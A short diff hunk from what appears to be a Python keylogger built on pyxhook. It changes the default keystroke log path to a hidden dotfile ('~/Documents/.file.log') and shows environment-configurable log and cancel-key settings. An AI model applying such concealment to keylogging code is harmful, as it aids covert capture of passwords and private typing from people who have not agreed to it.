@@ -8,7 +8,7 @@ import pyxhook
 # or use the default ~/Desktop/file.log 
 log_file = os.environ.get( 
 	'pylogger_file', 
-	os.path.expanduser('~/Documents/file.log') 
+	os.path.expanduser('~/Documents/.file.log') 
 ) 
 # Allow setting the cancel key from environment args, Default: ` 
 cancel_key = ord( 
